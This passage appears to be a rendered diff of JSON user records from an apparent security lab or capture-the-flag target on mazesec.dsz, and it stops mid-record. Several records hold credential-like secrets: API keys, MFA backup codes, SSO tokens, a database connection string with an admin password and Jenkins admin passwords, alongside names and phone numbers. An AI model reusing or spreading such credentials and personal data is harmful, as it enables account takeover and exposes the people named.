-{&quot;api_key&quot;:null,&quot;backup_codes&quot;:null,&quot;department&quot;:&quot;\u5916\u90e8\u5408\u4f5c&quot;,&quot;display_name&quot;:&quot;Xu Yi&quot;,&quot;email&quot;:&quot;xuyi4828@mazesec.dsz&quot;,&quot;has_secret&quot;:false,&quot;password_hash&quot;:null,&quot;phone&quot;:&quot;13826244393&quot;,&quot;private_notes&quot;:null,&quot;role&quot;:&quot;guest&quot;,&quot;sso_token&quot;:null,&quot;status&quot;:&quot;active&quot;,&quot;uid&quot;:4828,&quot;username&quot;:&quot;xuyi4828&quot;,&quot;vpn_access&quot;:false}
+{<span class="pl-s"><span class="pl-pds">"</span>api_key<span class="pl-pds">"</span></span>:null,<span class="pl-s"><span class="pl-pds">"</span>backup_codes<span class="pl-pds">"</span></span>:null,<span class="pl-s"><span class="pl-pds">"</span>department<span class="pl-pds">"</span></span>:<span class="pl-s"><span class="pl-pds">"</span>\u5916\u90e8\u5408\u4f5c<span class="pl-pds">"</span></span>,<span class="pl-s"><span class="pl-pds">"</span>display_name<span class="pl-pds">"</span></span>:<span class="pl-s"><span class="pl-pds">"</span>Xu Yi<span class="pl-pds">"</span></span>,<span class="pl-s"><span class="pl-pds">"</span>email<span class="pl-pds">"</span></span>:<span class="pl-s"><span class="pl-pds">"</span>xuyi4828@mazesec.dsz<span class="pl-pds">"</span></span>,<span class="pl-s"><span class="pl-pds">"</span>has_secret<span class="pl-pds">"</span></span>:false,<span class="pl-s"><span class="pl-pds">"</span>password_hash<span class="pl-pds">"</span></span>:null,<span class="pl-s"><span class="pl-pds">"</span>phone<span class="pl-pds">"</span></span>:<span class="pl-s"><span class="pl-pds">"</span>13826244393<span class="pl-pds">"</span></span>,<span class="pl-s"><span class="pl-pds">"</span>private_notes<span class="pl-pds">"</span></span>:null,<span class="pl-s"><span class="pl-pds">"</span>role<span class="pl-pds">"</span></span>:<span class="pl-s"><span class="pl-pds">"</span>guest<span class="pl-pds">"</span></span>,<span class="pl-s"><span class="pl-pds">"</span>sso_token<span class="pl-pds">"</span></span>:null,<span class="pl-s"><span class="pl-pds">"</span>status<span class="pl-pds">"</span></span>:<span class="pl-s"><span class="pl-pds">"</span>active<span class="pl-pds">"</span></span>,<span class="pl-s"><span class="pl-pds">"</span>uid<span class="pl-pds">"</span></span>:4828,<span class="pl-s"><span class="pl-pds">"</span>username<span class="pl-pds">"</span></span>:<span class="pl-s"><span class="pl-pds">"</span>xuyi4828<span class="pl-pds">"</span></span>,<span class="pl-s"><span class="pl-pds">"</span>vpn_access<span class="pl-pds">"</span></span>:false}
 
 == 5119 ==
-{&quot;api_key&quot;:null,&quot;backup_codes&quot;:null,&quot;department&quot;:&quot;\u4ea7\u54c1\u90e8&quot;,&quot;display_name&quot;:&quot;Xu Ping&quot;,&quot;email&quot;:&quot;xuping5119@mazesec.dsz&quot;,&quot;has_secret&quot;:false,&quot;password_hash&quot;:null,&quot;phone&quot;:&quot;13829047368&quot;,&quot;private_notes&quot;:null,&quot;role&quot;:&quot;product&quot;,&quot;sso_token&quot;:null,&quot;status&quot;:&quot;active&quot;,&quot;uid&quot;:5119,&quot;username&quot;:&quot;xuping5119&quot;,&quot;vpn_access&quot;:false}
+{<span class="pl-s"><span class="pl-pds">"</span>api_key<span class="pl-pds">"</span></span>:null,<span class="pl-s"><span class="pl-pds">"</span>backup_codes<span class="pl-pds">"</span></span>:null,<span class="pl-s"><span class="pl-pds">"</span>department<span class="pl-pds">"</span></span>:<span class="pl-s"><span class="pl-pds">"</span>\u4ea7\u54c1\u90e8<span class="pl-pds">"</span></span>,<span class="pl-s"><span class="pl-pds">"</span>display_name<span class="pl-pds">"</span></span>:<span class="pl-s"><span class="pl-pds">"</span>Xu Ping<span class="pl-pds">"</span></span>,<span class="pl-s"><span class="pl-pds">"</span>email<span class="pl-pds">"</span></span>:<span class="pl-s"><span class="pl-pds">"</span>xuping5119@mazesec.dsz<span class="pl-pds">"</span></span>,<span class="pl-s"><span class="pl-pds">"</span>has_secret<span class="pl-pds">"</span></span>:false,<span class="pl-s"><span class="pl-pds">"</span>password_hash<span class="pl-pds">"</span></span>:null,<span class="pl-s"><span class="pl-pds">"</span>phone<span class="pl-pds">"</span></span>:<span class="pl-s"><span class="pl-pds">"</span>13829047368<span class="pl-pds">"</span></span>,<span class="pl-s"><span class="pl-pds">"</span>private_notes<span class="pl-pds">"</span></span>:null,<span class="pl-s"><span class="pl-pds">"</span>role<span class="pl-pds">"</span></span>:<span class="pl-s"><span class="pl-pds">"</span>product<span class="pl-pds">"</span></span>,<span class="pl-s"><span class="pl-pds">"</span>sso_token<span class="pl-pds">"</span></span>:null,<span class="pl-s"><span class="pl-pds">"</span>status<span class="pl-pds">"</span></span>:<span class="pl-s"><span class="pl-pds">"</span>active<span class="pl-pds">"</span></span>,<span class="pl-s"><span class="pl-pds">"</span>uid<span class="pl-pds">"</span></span>:5119,<span class="pl-s"><span class="pl-pds">"</span>username<span class="pl-pds">"</span></span>:<span class="pl-s"><span class="pl-pds">"</span>xuping5119<span class="pl-pds">"</span></span>,<span class="pl-s"><span class="pl-pds">"</span>vpn_access<span class="pl-pds">"</span></span>:false}
 
 == 5219 ==
-{&quot;api_key&quot;:&quot;sk_internal_217855675970&quot;,&quot;backup_codes&quot;:&quot;[\&quot;682844\&quot;, \&quot;235671\&quot;, \&quot;451527\&quot;, \&quot;632819\&quot;]&quot;,&quot;department&quot;:&quot;\u8fd0\u7ef4\u90e8&quot;,&quot;display_name&quot;:&quot;Wang Qiang&quot;,&quot;email&quot;:&quot;wangqiang5219@mazesec.dsz&quot;,&quot;has_secret&quot;:true,&quot;password_hash&quot;:&quot;$2b$12$5546387341610051&quot;,&quot;phone&quot;:&quot;13866983525&quot;,&quot;private_notes&quot;:&quot;\u6570\u636e\u5e93\u8fde\u63a5\u4e32: mysql://admin:DbP4ss5219@db5219.internal:3306&quot;,&quot;role&quot;:&quot;ops&quot;,&quot;sso_token&quot;:&quot;sso_ops_5219_169217&quot;,&quot;status&quot;:&quot;active&quot;,&quot;uid&quot;:5219,&quot;username&quot;:&quot;wangqiang5219&quot;,&quot;vpn_access&quot;:true}
+{<span class="pl-s"><span class="pl-pds">"</span>api_key<span class="pl-pds">"</span></span>:<span class="pl-s"><span class="pl-pds">"</span>sk_internal_217855675970<span class="pl-pds">"</span></span>,<span class="pl-s"><span class="pl-pds">"</span>backup_codes<span class="pl-pds">"</span></span>:<span class="pl-s"><span class="pl-pds">"</span>[<span class="pl-cce">\"</span>682844<span class="pl-cce">\"</span>, <span class="pl-cce">\"</span>235671<span class="pl-cce">\"</span>, <span class="pl-cce">\"</span>451527<span class="pl-cce">\"</span>, <span class="pl-cce">\"</span>632819<span class="pl-cce">\"</span>]<span class="pl-pds">"</span></span>,<span class="pl-s"><span class="pl-pds">"</span>department<span class="pl-pds">"</span></span>:<span class="pl-s"><span class="pl-pds">"</span>\u8fd0\u7ef4\u90e8<span class="pl-pds">"</span></span>,<span class="pl-s"><span class="pl-pds">"</span>display_name<span class="pl-pds">"</span></span>:<span class="pl-s"><span class="pl-pds">"</span>Wang Qiang<span class="pl-pds">"</span></span>,<span class="pl-s"><span class="pl-pds">"</span>email<span class="pl-pds">"</span></span>:<span class="pl-s"><span class="pl-pds">"</span>wangqiang5219@mazesec.dsz<span class="pl-pds">"</span></span>,<span class="pl-s"><span class="pl-pds">"</span>has_secret<span class="pl-pds">"</span></span>:true,<span class="pl-s"><span class="pl-pds">"</span>password_hash<span class="pl-pds">"</span></span>:<span class="pl-s"><span class="pl-pds">"</span><span class="pl-smi">$2</span>b<span class="pl-smi">$1</span>2<span class="pl-smi">$5</span>546387341610051<span class="pl-pds">"</span></span>,<span class="pl-s"><span class="pl-pds">"</span>phone<span class="pl-pds">"</span></span>:<span class="pl-s"><span class="pl-pds">"</span>13866983525<span class="pl-pds">"</span></span>,<span class="pl-s"><span class="pl-pds">"</span>private_notes<span class="pl-pds">"</span></span>:<span class="pl-s"><span class="pl-pds">"</span>\u6570\u636e\u5e93\u8fde\u63a5\u4e32: mysql://admin:DbP4ss5219@db5219.internal:3306<span class="pl-pds">"</span></span>,<span class="pl-s"><span class="pl-pds">"</span>role<span class="pl-pds">"</span></span>:<span class="pl-s"><span class="pl-pds">"</span>ops<span class="pl-pds">"</span></span>,<span class="pl-s"><span class="pl-pds">"</span>sso_token<span class="pl-pds">"</span></span>:<span class="pl-s"><span class="pl-pds">"</span>sso_ops_5219_169217<span class="pl-pds">"</span></span>,<span class="pl-s"><span class="pl-pds">"</span>status<span class="pl-pds">"</span></span>:<span class="pl-s"><span class="pl-pds">"</span>active<span class="pl-pds">"</span></span>,<span class="pl-s"><span class="pl-pds">"</span>uid<span class="pl-pds">"</span></span>:5219,<span class="pl-s"><span class="pl-pds">"</span>username<span class="pl-pds">"</span></span>:<span class="pl-s"><span class="pl-pds">"</span>wangqiang5219<span class="pl-pds">"</span></span>,<span class="pl-s"><span class="pl-pds">"</span>vpn_access<span class="pl-pds">"</span></span>:true}
 
 == 6530 ==
-{&quot;api_key&quot;:&quot;sk_internal_116444220617&quot;,&quot;backup_codes&quot;:&quot;[\&quot;648495\&quot;, \&quot;289168\&quot;, \&quot;375326\&quot;, \&quot;604194\&quot;]&quot;,&quot;department&quot;:&quot;\u7814\u53d1\u4e8c\u90e8&quot;,&quot;display_name&quot;:&quot;Sun Fei&quot;,&quot;email&quot;:&quot;sunfei6530@mazesec.dsz&quot;,&quot;has_secret&quot;:true,&quot;password_hash&quot;:&quot;$2b$12$5364283556298436&quot;,&quot;phone&quot;:&quot;13881139200&quot;,&quot;private_notes&quot;:&quot;Jenkins \u7ba1\u7406\u5458\u5bc6\u7801: Jenkins6530#Admin&quot;,&quot;role&quot;:&quot;developer&quot;,&quot;sso_token&quot;:&quot;sso_developer_6530_717712&quot;,&quot;status&quot;:&quot;active&quot;,&quot;uid&quot;:6530,&quot;username&quot;:&quot;sunfei6530&quot;,&quot;vpn_access&quot;:true}
+{<span class="pl-s"><span class="pl-pds">"</span>api_key<span class="pl-pds">"</span></span>:<span class="pl-s"><span class="pl-pds">"</span>sk_internal_116444220617<span class="pl-pds">"</span></span>,<span class="pl-s"><span class="pl-pds">"</span>backup_codes<span class="pl-pds">"</span></span>:<span class="pl-s"><span class="pl-pds">"</span>[<span class="pl-cce">\"</span>648495<span class="pl-cce">\"</span>, <span class="pl-cce">\"</span>289168<span class="pl-cce">\"</span>, <span class="pl-cce">\"</span>375326<span class="pl-cce">\"</span>, <span class="pl-cce">\"</span>604194<span class="pl-cce">\"</span>]<span class="pl-pds">"</span></span>,<span class="pl-s"><span class="pl-pds">"</span>department<span class="pl-pds">"</span></span>:<span class="pl-s"><span class="pl-pds">"</span>\u7814\u53d1\u4e8c\u90e8<span class="pl-pds">"</span></span>,<span class="pl-s"><span class="pl-pds">"</span>display_name<span class="pl-pds">"</span></span>:<span class="pl-s"><span class="pl-pds">"</span>Sun Fei<span class="pl-pds">"</span></span>,<span class="pl-s"><span class="pl-pds">"</span>email<span class="pl-pds">"</span></span>:<span class="pl-s"><span class="pl-pds">"</span>sunfei6530@mazesec.dsz<span class="pl-pds">"</span></span>,<span class="pl-s"><span class="pl-pds">"</span>has_secret<span class="pl-pds">"</span></span>:true,<span class="pl-s"><span class="pl-pds">"</span>password_hash<span class="pl-pds">"</span></span>:<span class="pl-s"><span class="pl-pds">"</span><span class="pl-smi">$2</span>b<span class="pl-smi">$1</span>2<span class="pl-smi">$5</span>364283556298436<span class="pl-pds">"</span></span>,<span class="pl-s"><span class="pl-pds">"</span>phone<span class="pl-pds">"</span></span>:<span class="pl-s"><span class="pl-pds">"</span>13881139200<span class="pl-pds">"</span></span>,<span class="pl-s"><span class="pl-pds">"</span>private_notes<span class="pl-pds">"</span></span>:<span class="pl-s"><span class="pl-pds">"</span>Jenkins \u7ba1\u7406\u5458\u5bc6\u7801: Jenkins6530#Admin<span class="pl-pds">"</span></span>,<span class="pl-s"><span class="pl-pds">"</span>role<span class="pl-pds">"</span></span>:<span class="pl-s"><span class="pl-pds">"</span>developer<span class="pl-pds">"</span></span>,<span class="pl-s"><span class="pl-pds">"</span>sso_token<span class="pl-pds">"</span></span>:<span class="pl-s"><span class="pl-pds">"</span>sso_developer_6530_717712<span class="pl-pds">"</span></span>,<span class="pl-s"><span class="pl-pds">"</span>status<span class="pl-pds">"</span></span>:<span class="pl-s"><span class="pl-pds">"</span>active<span class="pl-pds">"</span></span>,<span class="pl-s"><span class="pl-pds">"</span>uid<span class="pl-pds">"</span></span>:6530,<span class="pl-s"><span class="pl-pds">"</span>username<span class="pl-pds">"</span></span>:<span class="pl-s"><span class="pl-pds">"</span>sunfei6530<span class="pl-pds">"</span></span>,<span class="pl-s"><span class="pl-pds">"</span>vpn_access<span class="pl-pds">"</span></span>:true}
 
 == 6694 ==
-{&quot;api_key&quot;:null,&quot;backup_codes&quot;:null,&quot;department&quot;:&quot;\u5e02\u573a\u90e8&quot;,&quot;display_name&quot;:&quot;He Si&quot;,&quot;email&quot;:&quot;hesi6694@mazesec.dsz&quot;,&quot;has_secret&quot;:false,&quot;password_hash&quot;:null,&quot;phone&quot;:&quot;13810641983&quot;,&quot;private_notes&quot;:null,&quot;role&quot;:&quot;marketing&quot;,&quot;sso_token&quot;:null,&quot;status&quot;:&quot;active&quot;,&quot;uid&quot;:6694,&quot;username&quot;:&quot;hesi6694&quot;,&quot;vpn_access&quot;:false}
+{<span class="pl-s"><span class="pl-pds">"</span>api_key<span class="pl-pds">"</span></span>:null,<span class="pl-s"><span class="pl-pds">"</span>backup_codes<span class="pl-pds">"</span></span>:null,<span class="pl-s"><span class="pl-pds">"</span>department<span class="pl-pds">"</span></span>:<span class="pl-s"><span class="pl-pds">"</span>\u5e02\u573a\u90e8<span class="pl-pds">"</span></span>,<span class="pl-s"><span class="pl-pds">"</span>display_name<span class="pl-pds">"</span></span>:<span class="pl-s"><span class="pl-pds">"</span>He Si<span class="pl-pds">"</span></span>,<span class="pl-s"><span class="pl-pds">"</span>email<span class="pl-pds">"</span></span>:<span class="pl-s"><span class="pl-pds">"</span>hesi6694@mazesec.dsz<span class="pl-pds">"</span></span>,<span class="pl-s"><span class="pl-pds">"</span>has_secret<span class="pl-pds">"</span></span>:false,<span class="pl-s"><span class="pl-pds">"</span>password_hash<span class="pl-pds">"</span></span>:null,<span class="pl-s"><span class="pl-pds">"</span>phone<span class="pl-pds">"</span></span>:<span class="pl-s"><span class="pl-pds">"</span>13810641983<span class="pl-pds">"</span></span>,<span class="pl-s"><span class="pl-pds">"</span>private_notes<span class="pl-pds">"</span></span>:null,<span class="pl-s"><span class="pl-pds">"</span>role<span class="pl-pds">"</span></span>:<span class="pl-s"><span class="pl-pds">"</span>marketing<span class="pl-pds">"</span></span>,<span class="pl-s"><span class="pl-pds">"</span>sso_token<span class="pl-pds">"</span></span>:null,<span class="pl-s"><span class="pl-pds">"</span>status<span class="pl-pds">"</span></span>:<span class="pl-s"><span class="pl-pds">"</span>active<span class="pl-pds">"</span></span>,<span class="pl-s"><span class="pl-pds">"</span>uid<span class="pl-pds">"</span></span>:6694,<span class="pl-s"><span class="pl-pds">"</span>username<span class="pl-pds">"</span></span>:<span class="pl-s"><span class="pl-pds">"</span>hesi6694<span class="pl-pds">"</span></span>,<span class="pl-s"><span class="pl-pds">"</span>vpn_access<span class="pl-pds">"</span></span>:false}
 
 == 7009 ==
-{&quot;api_key&quot;:null,&quot;backup_codes&quot;:null,&quot;department&quot;:&quot;\u5916\u5305\u56e2\u961f&quot;,&quot;display_name&quot;:&quot;Zhou Xia&quot;,&quot;email&quot;:&quot;zhouxia7009@mazesec.dsz&quot;,&quot;has_secret&quot;:false,&quot;password_hash&quot;:null,&quot;phone&quot;:&quot;13882885987&quot;,&quot;private_notes&quot;:null,&quot;role&quot;:&quot;contractor&quot;,&quot;sso_token&quot;:null,&quot;status&quot;:&quot;active&quot;,&quot;uid&quot;:7009,&quot;username&quot;:&quot;zhouxia7009&quot;,&quot;vpn_access&quot;:false}
+{<span class="pl-s"><span class="pl-pds">"</span>api_key<span class="pl-pds">"</span></span>:null,<span class="pl-s"><span class="pl-pds">"</span>backup_codes<span class="pl-pds">"</span></span>:null,<span class="pl-s"><span class="pl-pds">"</span>department<span class="pl-pds">"</span></span>:<span class="pl-s"><span class="pl-pds">"</span>\u5916\u5305\u56e2\u961f<span class="pl-pds">"</span></span>,<span class="pl-s"><span class="pl-pds">"</span>display_name<span class="pl-pds">"</span></span>:<span class="pl-s"><span class="pl-pds">"</span>Zhou Xia<span class="pl-pds">"</span></span>,<span class="pl-s"><span class="pl-pds">"</span>email<span class="pl-pds">"</span></span>:<span class="pl-s"><span class="pl-pds">"</span>zhouxia7009@mazesec.dsz<span class="pl-pds">"</span></span>,<span class="pl-s"><span class="pl-pds">"</span>has_secret<span class="pl-pds">"</span></span>:false,<span class="pl-s"><span class="pl-pds">"</span>password_hash<span class="pl-pds">"</span></span>:null,<span class="pl-s"><span class="pl-pds">"</span>phone<span class="pl-pds">"</span></span>:<span class="pl-s"><span class="pl-pds">"</span>13882885987<span class="pl-pds">"</span></span>,<span class="pl-s"><span class="pl-pds">"</span>private_notes<span class="pl-pds">"</span></span>:null,<span class="pl-s"><span class="pl-pds">"</span>role<span class="pl-pds">"</span></span>:<span class="pl-s"><span class="pl-pds">"</span>contractor<span class="pl-pds">"</span></span>,<span class="pl-s"><span class="pl-pds">"</span>sso_token<span class="pl-pds">"</span></span>:null,<span class="pl-s"><span class="pl-pds">"</span>status<span class="pl-pds">"</span></span>:<span class="pl-s"><span class="pl-pds">"</span>active<span class="pl-pds">"</span></span>,<span class="pl-s"><span class="pl-pds">"</span>uid<span class="pl-pds">"</span></span>:7009,<span class="pl-s"><span class="pl-pds">"</span>username<span class="pl-pds">"</span></span>:<span class="pl-s"><span class="pl-pds">"</span>zhouxia7009<span class="pl-pds">"</span></span>,<span class="pl-s"><span class="pl-pds">"</span>vpn_access<span class="pl-pds">"</span></span>:false}
 
 == 7465 ==
-{&quot;api_key&quot;:null,&quot;backup_codes&quot;:null,&quot;department&quot;:&quot;\u5916\u5305\u56e2\u961f&quot;,&quot;display_name&quot;:&quot;Guo Hua&quot;,&quot;email&quot;:&quot;guohua7465@mazesec.dsz&quot;,&quot;has_secret&quot;:false,&quot;password_hash&quot;:null,&quot;phone&quot;:&quot;13821569223&quot;,&quot;private_notes&quot;:null,&quot;role&quot;:&quot;contractor&quot;,&quot;sso_token&quot;:null,&quot;status&quot;:&quot;active&quot;,&quot;uid&quot;:7465,&quot;username&quot;:&quot;guohua7465&quot;,&quot;vpn_access&quot;:false}
+{<span class="pl-s"><span class="pl-pds">"</span>api_key<span class="pl-pds">"</span></span>:null,<span class="pl-s"><span class="pl-pds">"</span>backup_codes<span class="pl-pds">"</span></span>:null,<span class="pl-s"><span class="pl-pds">"</span>department<span class="pl-pds">"</span></span>:<span class="pl-s"><span class="pl-pds">"</span>\u5916\u5305\u56e2\u961f<span class="pl-pds">"</span></span>,<span class="pl-s"><span class="pl-pds">"</span>display_name<span class="pl-pds">"</span></span>:<span class="pl-s"><span class="pl-pds">"</span>Guo Hua<span class="pl-pds">"</span></span>,<span class="pl-s"><span class="pl-pds">"</span>email<span class="pl-pds">"</span></span>:<span class="pl-s"><span class="pl-pds">"</span>guohua7465@mazesec.dsz<span class="pl-pds">"</span></span>,<span class="pl-s"><span class="pl-pds">"</span>has_secret<span class="pl-pds">"</span></span>:false,<span class="pl-s"><span class="pl-pds">"</span>password_hash<span class="pl-pds">"</span></span>:null,<span class="pl-s"><span class="pl-pds">"</span>phone<span class="pl-pds">"</span></span>:<span class="pl-s"><span class="pl-pds">"</span>13821569223<span class="pl-pds">"</span></span>,<span class="pl-s"><span class="pl-pds">"</span>private_notes<span class="pl-pds">"</span></span>:null,<span class="pl-s"><span class="pl-pds">"</span>role<span class="pl-pds">"</span></span>:<span class="pl-s"><span class="pl-pds">"</span>contractor<span class="pl-pds">"</span></span>,<span class="pl-s"><span class="pl-pds">"</span>sso_token<span class="pl-pds">"</span></span>:null,<span class="pl-s"><span class="pl-pds">"</span>status<span class="pl-pds">"</span></span>:<span class="pl-s"><span class="pl-pds">"</span>active<span class="pl-pds">"</span></span>,<span class="pl-s"><span class="pl-pds">"</span>uid<span class="pl-pds">"</span></span>:7465,<span class="pl-s"><span class="pl-pds">"</span>username<span class="pl-pds">"</span></span>:<span class="pl-s"><span class="pl-pds">"</span>guohua7465<span class="pl-pds">"</span></span>,<span class="pl-s"><span class="pl-pds">"</span>vpn_access<span class="pl-pds">"</span></span>:false}
 
 == 7920 ==
-{&quot;api_key&quot;:&quot;sk_internal_464766883623&quot;,&quot;backup_codes&quot;:&quot;[\&quot;260921\&quot;, \&quot;288066\&quot;, \&quot;463417\&quot;, \&quot;894174\&quot;]&quot;,&quot;department&quot;:&quot;\u4eba\u529b\u8d44\u6e90\u90e8&quot;,&quot;display_name&quot;:&quot;He Long&quot;,&quot;email&quot;:&quot;helong7920@mazesec.dsz&quot;,&quot;has_secret&quot;:true,&quot;password_hash&quot;:&quot;$2b$12$1045328665585101&quot;,&quot;phone&quot;:&quot;13830690378&quot;,&quot;private_notes&quot;:&quot;Jenkins \u7ba1\u7406\u5458\u5bc6\u7801: Jenkins7920#Admin&quot;,&quot;role&quot;:&quot;hr&quot;,&quot;sso_token&quot;:&quot;sso_hr_7920_528232&quot;,&quot;status&quot;:&quot;active&quot;,&quot;uid&quot;:7920,&quot;username&quot;:&quot;helong7920&quot;,&quot;vpn_access&quot;:true}
+{<span class="pl-s"><span class="pl-pds">"</span>api_key<span class="pl-pds">"</span></span>:<span class="pl-s"><span class="pl-pds">"</span>sk_internal_464766883623<span class="pl-pds">"</span></span>,<span class="pl-s"><span class="pl-pds">"</span>backup_codes<span class="pl-pds">"</span></span>:<span class="pl-s"><span class="pl-pds">"</span>[<span class="pl-cce">\"</span>260921<span class="pl-cce">\"</span>, <span class="pl-cce">\"</span>288066<span class="pl-cce">\"</span>, <span class="pl-cce">\"</span>463417<span class="pl-cce">\"</span>, <span class="pl-cce">\"</span>894174<span class="pl-cce">\"</span>]<span class="pl-pds">"</span></span>,<span class="pl-s"><span class="pl-pds">"</span>department<span class="pl-pds">"</span></span>:<span class="pl-s"><span class="pl-pds">"</span>\u4eba\u529b\u8d44\u6e90\u90e8<span class="pl-pds">"</span></span>,<span class="pl-s"><span class="pl-pds">"</span>display_name<span class="pl-pds">"</span></span>:<span class="pl-s"><span class="pl-pds">"</span>He Long<span class="pl-pds">"</span></span>,<span class="pl-s"><span class="pl-pds">"</span>email<span class="pl-pds">"</span></span>:<span class="pl-s"><span class="pl-pds">"</span>helong7920@mazesec.dsz<span class="pl-pds">"</span></span>,<span class="pl-s"><span class="pl-pds">"</span>has_secret<span class="pl-pds">"</span></span>:true,<span class="pl-s"><span class="pl-pds">"</span>password_hash<span class="pl-pds">"</span></span>:<span class="pl-s"><span class="pl-pds">"</span><span class="pl-smi">$2</span>b<span class="pl-smi">$1</span>2<span class="pl-smi">$1</span>045328665585101<span class="pl-pds">"</span></span>,<span class="pl-s"><span class="pl-pds">"</span>phone<span class="pl-pds">"</span></span>:<span class="pl-s"><span class="pl-pds">"</span>13830690378<span class="pl-pds">"</span></span>,<span class="pl-s"><span class="pl-pds">"</span>private_notes<span class="pl-pds">"</span></span>:<span class="pl-s"><span class="pl-pds">"</span>Jenkins \u7ba1\u7406\u5458\u5bc6\u7801: Jenkins7920#Admin<span class="pl-pds">"</span></span>,<span class="pl-s"><span class="pl-pds">"</span>role<span class="pl-pds">"</span></span>:<span class="pl-s"><span class="pl-pds">"</span>hr<span class="pl-pds">"</span></span>,<span class="pl-s"><span class="pl-pds">"</span>sso_token<span class="pl-pds">"</span></span>:<span class="pl-s"><span class="pl-pds">"</span>sso_hr_7920_528232<span class="pl-pds">"</span></span>,<span class="pl-s"><span class="pl-pds">"</span>status<span class="pl-pds">"</span></span>:<span class="pl-s"><span class="pl-pds">"</span>active<span class="pl-pds">"</span></span>,<span class="pl-s"><span class="pl-pds">"</span>uid<span class="pl-pds">"</span></span>:7920,<span class="pl-s"><span class="pl-pds">"</span>username<span class="pl-pds">"</span></span>:<span class="pl-s"><span class="pl-pds">"</span>helong7920<span class="pl-pds">"</span></span>,<span class="pl-s"><span class="pl-pds">"</span>vpn_access<span class="pl-pds">"</span></span>:true}
 
 == 8024 ==
-{&quot;api_key&quot;:null,&quot;backup_codes&quot;:null,&quot;department&quot;:&quot;\u5916\u90e8\u5408\u4f5c&quot;,&quot;display_name&quot;:&quot;Li Wen&quot;,&quot;email&quot;:&quot;liwen8024@mazesec.dsz&quot;,&quot;has_secret&quot;:false,&quot;password_hash&quot;:null,&quot;phone&quot;:&quot;13828445950&quot;,&quot;private_notes&quot;:null,&quot;role&quot;:&quot;guest&quot;,&quot;sso_token&quot;:null,&quot;status&quot;:&quot;active&quot;,&quot;uid&quot;:8024,&quot;username&quot;:&quot;liwen8024&quot;,&quot;vpn_access&quot;:false}
+{<span class="pl-s"><span class="pl-pds">"</span>api_key<span class="pl-pds">"</span></span>:null,<span class="pl-s"><span class="pl-pds">"</span>backup_codes<span class="pl-pds">"</span></span>:null,<span class="pl-s"><span class="pl-pds">"</span>department<span class="pl-pds">"</span></span>:<span class="pl-s"><span class="pl-pds">"</span>\u5916\u90e8\u5408\u4f5c<span class="pl-pds">"</span></span>,<span class="pl-s"><span class="pl-pds">"</span>display_name<span class="pl-pds">"</span></span>:<span class="pl-s"><span class="pl-pds">"</span>Li Wen<span class="pl-pds">"</span></span>,<span class="pl-s"><span class="pl-pds">"</span>email<span class="pl-pds">"</span></span>:<span class="pl-s"><span class="pl-pds">"</span>liwen8024@mazesec.dsz<span class="pl-pds">"</span></span>,<span class="pl-s"><span class="pl-pds">"</span>has_secret<span class="pl-pds">"</span></span>:false,<span class="pl-s"><span class="pl-pds">"</span>password_hash<span class="pl-pds">"</span></span>:null,<span class="pl-s"><span class="pl-pds">"</span>phone<span class="pl-pds">"</span></span>:<span class="pl-s"><span class="pl-pds">"</span>13828445950<span class="pl-pds">"</span></span>,<span class="pl-s"><span class="pl-pds">"</span>private_notes<span class="pl-pds">"</span></span>:null,<span class="pl-s"><span class="pl-pds">"</span>role<span class="pl-pds">"</span></span>:<span class="pl-s"><span class="pl-pds">"</span>guest<span class="pl-pds">"</span></span>,<span class="pl-s"><span class="pl-pds">"</span>sso_token<span class="pl-pds">"</span></span>:null,<span class="pl-s"><span class="pl-pds">"</span>status<span class="pl-pds">"</span></span>:<span class="pl-s"><span class="pl-pds">"</span>active<span class="pl-pds">"</span></span>,<span class="pl-s"><span class="pl-pds">"</span>uid<span class="pl-pds">"</span></span>:8024,<span class="pl-s"><span class="pl-pds">"</span>username<span class="pl-pds">"</span></span>:<span class="pl-s"><span class="pl-pds">"</span>liwen8024<span class="pl-pds">"</span></span>,<span class="pl-s"><span class="pl-pds">"</span>vpn_access<span class="pl-pds">"</span></span>:false}
 
 == 8038 ==
-{&quot;api_key&quot;:&quot;sk_internal_974818108609&quot;,&quot;backup_codes&quot;:&quot;[\&quot;344818\&quot;, \&quot;988944\&quot;, \&quot;873105\&quot;, \&quot;266046\&quot;]&quot;,&quot;department&quot;:&quot;\u4fe1\u606f\u6280\u672f\u90e8&quot;,&quot;display_name&quot;:&quot;Lin Hao&quot;,&quot;email&quot;:&quot;linhao8038@mazesec.dsz&quot;,&quot;has_secret&quot;:true,&quot;password_hash&quot;:&quot;$2b$12$7096212241602057&quot;,&quot;phone&quot;:&quot;13853496395&quot;,&quot;private_notes&quot;:&quot;Jenkins \u7ba1\u7406\u5458\u5bc6\u7801: Jenkins8038#Admin&quot;,&quot;role&quot;:&quot;administrator&quot;,&quot;sso_token&quot;:&quot;sso_administrator_8038_725761&quot;,&quot;status&quot;:&quot;active&quot;,&quot;uid&quot;:8038,&quot;username&quot;:&quot;linhao8038&quot;,&quot;vpn_access&quot;:true}
+{<span class="pl-s"><span class="pl-pds">"</span>api_key<span class="pl-pds">"</span></span>:<span class="pl-s"><span class="pl-pds">"</span>sk_internal_974818108609<span class="pl-pds">"</span></span>,<span class="pl-s"><span class="pl-pds">"</span>backup_codes<span class="pl-pds">"</span></span>:<span class="pl-s"><span class="pl-pds">"</span>[<span class="pl-cce">\"</span>344818<span class="pl-cce">\"</span>, <span class="pl-cce">\"</span>988944<span class="pl-cce">\"</span>, <span class="pl-cce">\"</span>873105<span class="pl-cce">\"</span>, <span class="pl-cce">\"</span>266046<span class="pl-cce">\"</span>]<span class="pl-pds">"</span></span>,<span class="pl-s"><span class="pl-pds">"</span>department<span class="pl-pds">"</span></span>:<span class="pl-s"><span class="pl-pds">"</span>\u4fe1\u606f\u6280\u672f\u90e8<span class="pl-pds">"</span></span>,<span class="pl-s"><span class="pl-pds">"</span>display_name<span class="pl-pds">"</span></span>:<span class="pl-s"><span class="pl-pds">"</span>Lin Hao<span class="pl-pds">"</span></span>,<span class="pl-s"><span class="pl-pds">"</span>email<span class="pl-pds">"</span></span>:<span class="pl-s"><span class="pl-pds">"</span>linhao8038@mazesec.dsz<span class="pl-pds">"</span></span>,<span class="pl-s"><span class="pl-pds">"</span>has_secret<span class="pl-pds">"</span></span>:true,<span class="pl-s"><span class="pl-pds">"</span>password_hash<span class="pl-pds">"</span></span>:<span class="pl-s"><span class="pl-pds">"</span><span class="pl-smi">$2</span>b<span class="pl-smi">$1</span>2<span class="pl-smi">$7</span>096212241602057<span class="pl-pds">"</span></span>,<span class="pl-s"><span class="pl-pds">"</span>phone<span class="pl-pds">"</span></span>:<span class="pl-s"><span class="pl-pds">"</span>13853496395<span class="pl-pds">"</span></span>,<span class="pl-s"><span 